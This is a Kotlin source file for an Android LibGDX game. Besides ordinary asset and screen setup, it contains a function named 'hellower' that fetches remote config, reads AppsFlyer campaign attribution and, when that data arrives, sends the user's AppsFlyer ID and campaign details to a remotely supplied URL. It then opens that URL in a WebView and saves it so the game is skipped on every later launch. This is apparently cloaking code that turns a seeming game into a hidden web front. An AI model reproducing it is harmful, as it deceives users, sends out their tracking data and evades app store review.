package com.cburaktev.klavregasd.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.cburaktev.klavregasd.MainActivity
import com.cburaktev.klavregasd.appContext
import com.cburaktev.klavregasd.game.dataStore.DS_ItemData
import com.cburaktev.klavregasd.game.manager.MusicManager
import com.cburaktev.klavregasd.game.manager.NavigationManager
import com.cburaktev.klavregasd.game.manager.SoundManager
import com.cburaktev.klavregasd.game.manager.SpriteManager
import com.cburaktev.klavregasd.game.manager.util.MusicUtil
import com.cburaktev.klavregasd.game.manager.util.SoundUtil
import com.cburaktev.klavregasd.game.manager.util.SpriteUtil
import com.cburaktev.klavregasd.game.screens.LoaderScreen
import com.cburaktev.klavregasd.game.utils.GameColor
import com.cburaktev.klavregasd.game.utils.advanced.AdvancedGame
import com.cburaktev.klavregasd.game.utils.disposeAll
import com.cburaktev.klavregasd.game.utils.gdxGame
import com.cburaktev.klavregasd.util.Gist
import com.cburaktev.klavregasd.util.log
import kotlinx.coroutines.*
import java.util.concurrent.atomic.AtomicBoolean

var GDX_GLOBAL_isGame = false
    private set

var GDX_GLOBAL_isPauseGame = false

class GDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val assetsLoader by lazy { SpriteUtil.Loader() }
    val assetsAll    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil()    }
    val soundUtil by lazy { SoundUtil()    }

    var backgroundColor = GameColor.background
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("Tadam", MODE_PRIVATE)

    val ds_ItemData = DS_ItemData(coroutine)

    override fun create() {
        navigationManager = NavigationManager()
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        hellower()
    }

    override fun render() {
        if (GDX_GLOBAL_isPauseGame) return

        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    override fun pause() {
        super.pause()
        if (GDX_GLOBAL_isPauseGame) musicUtil.currentMusic?.pause()
    }

    override fun resume() {
        super.resume()
        if (GDX_GLOBAL_isPauseGame.not()) musicUtil.currentMusic?.play()
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun hellower() {
        log("hellower")
        activity.blockRedirect = { GDX_GLOBAL_isGame = true }
        activity.initWeb()

        //GDX_GLOBAL_isGame = true
        //return

        val path = sharedPreferences.getString("polo", "N") ?: "N"

        try {
            if (path == "N") {
                coroutine.launch(Dispatchers.Main) {
                    val poket = withContext(Dispatchers.IO) { Gist.getDataJson() }

                    if (poket != null) {
                        AppsFlyerLib.getInstance().init(poket.keyer, getAppsFlyerConversionListener(poket.likor), appContext)
                        AppsFlyerLib.getInstance().start(gdxGame.activity, poket.keyer, getAppsFlyerRequestListener())
                    } else {
                        GDX_GLOBAL_isGame = true
                    }
                }
            } else {
                activity.loadUrl(path)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GDX_GLOBAL_isGame = true
        }
    }

    private fun getAppsFlyerConversionListener(sma: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"]     as? String
                val afAd     = appfMap["af_ad"]        as? String
                val media    = appfMap["media_source"] as? String

                val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                log("Result: campaign = $campaign | afAd = $afAd | media_source = $media | appfMap = $appfMap")

                val link = "$sma?twsfyiwa=$campaign&ivsjvpb=$afAd&ddswcecjt=$media&unsyh=$afId"
                log("link = $link")

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("polo", link).apply() }

                activity.loadUrl(link)

            } else GDX_GLOBAL_isGame = true
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            GDX_GLOBAL_isGame = true
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
        }
    }

}